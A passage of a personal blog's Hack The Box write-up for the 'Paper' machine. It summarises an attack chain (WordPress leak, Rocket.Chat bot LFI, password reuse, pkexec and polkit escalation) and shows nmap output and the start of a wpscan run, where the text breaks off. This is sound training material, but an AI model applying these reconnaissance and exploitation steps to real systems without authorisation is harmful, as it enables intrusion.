<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - Paper" />
<meta property="og:locale" content="en" />
<meta name="description" content="Paper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installation. In rocket chat a bot is vulnerable to LFI which gets us a password that is reused for the user dwight. In the root stage we will go over the unintended method of using pkexec and the intended one of abusing polkit to add another user with sudo rights and root the machine." />
<meta property="og:description" content="Paper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installation. In rocket chat a bot is vulnerable to LFI which gets us a password that is reused for the user dwight. In the root stage we will go over the unintended method of using pkexec and the intended one of abusing polkit to add another user with sudo rights and root the machine." />
<link rel="canonical" href="http://localhost:4000/posts/paper/" />
<meta property="og:url" content="http://localhost:4000/posts/paper/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/img/paper/000_info_card.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-06-18T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/img/paper/000_info_card.png" />
<meta property="twitter:title" content="Hack The Box - Paper" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-18T00:00:00+08:00","datePublished":"2022-06-18T00:00:00+08:00","description":"Paper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installation. In rocket chat a bot is vulnerable to LFI which gets us a password that is reused for the user dwight. In the root stage we will go over the unintended method of using pkexec and the intended one of abusing polkit to add another user with sudo rights and root the machine.","headline":"Hack The Box - Paper","image":"http://localhost:4000/img/paper/000_info_card.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/paper/"},"url":"http://localhost:4000/posts/paper/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - Paper | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">𝐄𝐭𝐡𝐢𝐜𝐚𝐥 𝐇𝐚𝐜𝐤𝐞𝐫 || 𝐒𝐨𝐟𝐭𝐰𝐚𝐫𝐞 𝐄𝐧𝐠𝐢𝐧𝐞𝐞𝐫 || 𝐂𝐲𝐛𝐞𝐫 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐑𝐞𝐬𝐚𝐫𝐜𝐡𝐞𝐫.!! 𝐎𝐒𝐂𝐏 & 𝐎𝐒𝐄𝐏.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Hack The Box - Paper</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - Paper</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1655481600"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Jun 18, 2022
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/img/paper/000_info_card.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1605 words">
  <em>8 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <h1 id="user">User</h1>
<p>Paper is an easy rated machine on HackTheBox created by <a href="https://www.hackthebox.com/home/users/profile/92926">secnigma</a>. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installation. In rocket chat a bot is vulnerable to LFI which gets us a password that is reused for the user dwight. In the root stage we will go over the unintended method of using pkexec and the intended one of abusing polkit to add another user with sudo rights and root the machine.</p>

<h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>As usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.</p>

<p><code class="language-plaintext highlighter-rouge">All ports</code></p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="nx">$</span> <span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">n</span> <span class="o">-</span><span class="nx">p</span><span class="o">-</span> <span class="o">-</span><span class="nx">T4</span> <span class="mf">10.129</span><span class="p">.</span><span class="mf">158.20</span>
<span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2022-02-05 20:52 CET</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">10.129</span><span class="p">.</span><span class="mf">158.20</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nf">up </span><span class="p">(</span><span class="mf">0.028</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span> <span class="nx">shown</span><span class="p">:</span> <span class="mi">65528</span> <span class="nx">closed</span> <span class="nx">tcp</span> <span class="nf">ports </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
<span class="nx">PORT</span>      <span class="nx">STATE</span>    <span class="nx">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span>    <span class="nx">open</span>     <span class="nx">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>    <span class="nx">open</span>     <span class="nx">http</span>
<span class="mi">443</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>     <span class="nx">https</span>

<span class="nx">Nmap</span> <span class="nx">done</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">IP</span> <span class="nf">address </span><span class="p">(</span><span class="mi">1</span> <span class="nx">host</span> <span class="nx">up</span><span class="p">)</span> <span class="nx">scanned</span> <span class="k">in</span> <span class="mf">1130.89</span> <span class="nx">seconds</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">Script and Version</code></p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="nx">$</span> <span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">n</span> <span class="o">-</span><span class="nx">sC</span> <span class="o">-</span><span class="nx">sV</span> <span class="o">-</span><span class="nx">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">443</span> <span class="mf">10.129</span><span class="p">.</span><span class="mf">158.20</span>
<span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2022-02-05 21:14 CET</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">10.129</span><span class="p">.</span><span class="mf">158.20</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nf">up </span><span class="p">(</span><span class="mf">0.033</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>

<span class="nx">PORT</span>    <span class="nx">STATE</span> <span class="nx">SERVICE</span>  <span class="nx">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">ssh</span>      <span class="nx">OpenSSH</span> <span class="mf">8.0</span> <span class="p">(</span><span class="nx">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span>
<span class="o">|</span>   <span class="mi">2048</span> <span class="mi">10</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="nx">ea</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="nx">a6</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="nx">cb</span><span class="p">:</span><span class="mi">1</span><span class="nx">c</span><span class="p">:</span><span class="mi">9</span><span class="nx">c</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="nx">df</span><span class="p">:</span><span class="mi">5</span><span class="nx">f</span><span class="p">:</span><span class="mi">83</span><span class="p">:</span><span class="nx">e0</span><span class="p">:</span><span class="mi">64</span> <span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">58</span><span class="p">:</span><span class="mi">8</span><span class="nx">c</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="mi">1</span><span class="nx">c</span><span class="p">:</span><span class="nx">c6</span><span class="p">:</span><span class="mi">63</span><span class="p">:</span><span class="mi">2</span><span class="nx">a</span><span class="p">:</span><span class="mi">83</span><span class="p">:</span><span class="mi">87</span><span class="p">:</span><span class="mi">5</span><span class="nx">c</span><span class="p">:</span><span class="mi">2</span><span class="nx">f</span><span class="p">:</span><span class="mi">2</span><span class="nx">b</span><span class="p">:</span><span class="mi">4</span><span class="nx">f</span><span class="p">:</span><span class="mi">4</span><span class="nx">d</span><span class="p">:</span><span class="nx">c3</span><span class="p">:</span><span class="mi">79</span> <span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_</span>  <span class="mi">256</span> <span class="mi">31</span><span class="p">:</span><span class="mi">78</span><span class="p">:</span><span class="nx">af</span><span class="p">:</span><span class="nx">d1</span><span class="p">:</span><span class="mi">3</span><span class="nx">b</span><span class="p">:</span><span class="nx">c4</span><span class="p">:</span><span class="mi">2</span><span class="nx">e</span><span class="p">:</span><span class="mi">9</span><span class="nx">d</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="mi">4</span><span class="nx">e</span><span class="p">:</span><span class="nx">eb</span><span class="p">:</span><span class="mi">5</span><span class="nx">d</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="nx">ec</span><span class="p">:</span><span class="nx">a0</span><span class="p">:</span><span class="mi">22</span> <span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">http</span>     <span class="nx">Apache</span> <span class="nx">httpd</span> <span class="mf">2.4</span><span class="p">.</span><span class="mi">37</span> <span class="p">((</span><span class="nx">centos</span><span class="p">)</span> <span class="nx">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="p">.</span><span class="mi">1</span><span class="nx">k</span> <span class="nx">mod_fcgid</span><span class="o">/</span><span class="mf">2.3</span><span class="p">.</span><span class="mi">9</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span> <span class="nx">HTTP</span> <span class="nx">Server</span> <span class="nx">Test</span> <span class="nx">Page</span> <span class="nx">powered</span> <span class="nx">by</span> <span class="nx">CentOS</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">generator</span><span class="p">:</span> <span class="nx">HTML</span> <span class="nx">Tidy</span> <span class="k">for</span> <span class="nx">HTML5</span> <span class="k">for</span> <span class="nx">Linux</span> <span class="nx">version</span> <span class="mf">5.7</span><span class="p">.</span><span class="mi">28</span>
<span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span>
<span class="o">|</span><span class="nx">_</span>  <span class="nx">Potentially</span> <span class="nx">risky</span> <span class="nx">methods</span><span class="p">:</span> <span class="nx">TRACE</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">37</span> <span class="p">(</span><span class="nx">centos</span><span class="p">)</span> <span class="nx">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="p">.</span><span class="mi">1</span><span class="nx">k</span> <span class="nx">mod_fcgid</span><span class="o">/</span><span class="mf">2.3</span><span class="p">.</span><span class="mi">9</span>
<span class="mi">443</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ssl</span><span class="o">/</span><span class="nx">http</span> <span class="nx">Apache</span> <span class="nx">httpd</span> <span class="mf">2.4</span><span class="p">.</span><span class="mi">37</span> <span class="p">((</span><span class="nx">centos</span><span class="p">)</span> <span class="nx">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="p">.</span><span class="mi">1</span><span class="nx">k</span> <span class="nx">mod_fcgid</span><span class="o">/</span><span class="mf">2.3</span><span class="p">.</span><span class="mi">9</span><span class="p">)</span>
<span class="o">|</span> <span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span> <span class="nx">Subject</span><span class="p">:</span> <span class="nx">commonName</span><span class="o">=</span><span class="nx">localhost</span><span class="p">.</span><span class="nx">localdomain</span><span class="o">/</span><span class="nx">organizationName</span><span class="o">=</span><span class="nx">Unspecified</span><span class="o">/</span><span class="nx">countryName</span><span class="o">=</span><span class="nx">US</span>
<span class="o">|</span> <span class="nx">Subject</span> <span class="nx">Alternative</span> <span class="nx">Name</span><span class="p">:</span> <span class="nx">DNS</span><span class="p">:</span><span class="nx">localhost</span><span class="p">.</span><span class="nx">localdomain</span>
<span class="o">|</span> <span class="nx">Not</span> <span class="nx">valid</span> <span class="nx">before</span><span class="p">:</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">03</span><span class="nx">T08</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">34</span>
<span class="o">|</span><span class="nx">_Not</span> <span class="nx">valid</span> <span class="nx">after</span><span class="p">:</span>  <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">08</span><span class="nx">T10</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">34</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">37</span> <span class="p">(</span><span class="nx">centos</span><span class="p">)</span> <span class="nx">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="p">.</span><span class="mi">1</span><span class="nx">k</span> <span class="nx">mod_fcgid</span><span class="o">/</span><span class="mf">2.3</span><span class="p">.</span><span class="mi">9</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span> <span class="mi">400</span> <span class="nx">Bad</span> <span class="nx">Request</span>
<span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span>
<span class="o">|</span><span class="nx">_</span>  <span class="nx">Potentially</span> <span class="nx">risky</span> <span class="nx">methods</span><span class="p">:</span> <span class="nx">TRACE</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span> <span class="nx">TLS</span> <span class="nx">randomness</span> <span class="nx">does</span> <span class="nx">not</span> <span class="nx">represent</span> <span class="nx">time</span>
<span class="o">|</span> <span class="nx">tls</span><span class="o">-</span><span class="nx">alpn</span><span class="p">:</span>
<span class="o">|</span><span class="nx">_</span>  <span class="nx">http</span><span class="o">/</span><span class="mf">1.1</span>

<span class="nx">Service</span> <span class="nx">detection</span> <span class="nx">performed</span><span class="p">.</span> <span class="nx">Please</span> <span class="nx">report</span> <span class="nx">any</span> <span class="nx">incorrect</span> <span class="nx">results</span> <span class="nx">at</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="nx">Nmap</span> <span class="nx">done</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">IP</span> <span class="nf">address </span><span class="p">(</span><span class="mi">1</span> <span class="nx">host</span> <span class="nx">up</span><span class="p">)</span> <span class="nx">scanned</span> <span class="k">in</span> <span class="mf">20.95</span> <span class="nx">seconds</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="wordpress-draft"><span class="mr-2">Wordpress draft</span><a href="#wordpress-draft" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>From the open ports http and https seem to be most promising. Opening port 80 in our browser we see the the Centos http server test page.</p>

<p><a href="/img/paper/005_home.png"><img data-src="/img/paper/005_home.png" alt="005_home" data-proofer-ignore></a></p>

<p>Intercepting a request in burp and looking at the response headers in repeater we can find that it leaks the vhost <code class="language-plaintext highlighter-rouge">office.paper</code> which we add to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>

<p><a href="/img/paper/010_vhost_leak.png"><img data-src="/img/paper/010_vhost_leak.png" alt="010_vhost_leak" data-proofer-ignore></a></p>

<p>Opening <code class="language-plaintext highlighter-rouge">http://office.paper</code> in our browser we see a wordpress blog.</p>

<p><a href="/img/paper/015_vhost_home.png"><img data-src="/img/paper/015_vhost_home.png" alt="015_vhost_home" data-proofer-ignore></a></p>

<p>Scanning the page using <code class="language-plaintext highlighter-rouge">wpscan</code> we can identify the version to be <code class="language-plaintext highlighter-rouge">5.3</code> and thus out of date.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre><span class="nx">$</span> <span class="nx">wpscan</span> <span class="o">--</span><span class="nx">url</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//office.paper/  -e u</span>

<span class="p">...[</span><span class="nx">snip</span><span class="p">]...</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">WordPress</span> <span class="nx">version</span> <span class="mf">5.2</span><span class="p">.</span><span class="mi">3</span> <span class="nf">identified </span><span class="p">(</span><span class="nx">Insecure</span><span class="p">,</span> <span class="nx">released</span> <span class="nx">on</span> <span class="mi">2019</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">05</span><span class="p">).</span>
 <span class="o">|</span> <span class="nx">Found</span> <span class="nx">By</span><span class="p">:</span> <span class="nx">Rss</span> <span class="nc">Generator </span><span class="p">(</span><span class="nx">Passive</span> <span class="nx">Detection</span><span class="p">)</span>
